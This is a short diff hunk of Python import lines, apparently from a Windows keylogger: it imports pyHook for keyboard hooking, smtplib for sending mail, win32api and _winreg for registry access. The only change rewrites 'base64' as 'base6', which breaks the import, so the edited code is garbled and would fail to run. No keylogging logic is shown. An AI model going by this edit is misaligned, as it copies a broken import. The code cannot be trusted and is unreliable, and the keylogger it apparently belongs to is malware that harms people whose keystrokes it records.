@@ -1,5 +1,5 @@
 import sys
-import pyHook,os,time,random,smtplib,string,base64
+import pyHook,os,time,random,smtplib,string,base6
 import win32api,pythoncom
 from _winreg import *
 
